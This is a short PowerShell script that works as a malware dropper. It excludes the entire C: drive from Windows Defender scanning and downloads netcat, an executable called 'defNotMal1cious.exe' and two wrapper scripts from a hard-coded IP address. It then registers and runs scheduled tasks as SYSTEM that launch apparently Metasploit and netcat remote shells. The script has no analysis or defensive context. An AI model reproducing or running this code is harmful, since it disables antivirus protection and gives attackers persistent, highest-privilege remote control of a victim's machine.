Add-MpPreference -ExclusionPath "C:\";
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/nc.exe -OutFile C:/nc.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMalicious.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperMSF.ps1 -OutFile C:/windowsWrapperMSF.ps1;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperNC.ps1 -OutFile C:/windowsWrapperNC.ps1;
$Action2=New-ScheduledTaskAction -Execute PowerShell.exe -WorkingDirectory C:/ -Argument “C:\windowsWrapperMSF.ps1";
Register-ScheduledTask -TaskName "windowsMSF" -Action $Action2 -RunLevel Highest -User "System" -Force;
$Action1=New-ScheduledTaskAction -Execute PowerShell.exe -WorkingDirectory C:/ -Argument “C:\windowsWrapperNC.ps1";
Register-ScheduledTask -TaskName "windowsNC" -Action $Action1 -RunLevel Highest -User "System" -Force;
schtasks.exe /run /tn windowsNC;
schtasks.exe /run /tn windowsMSF;
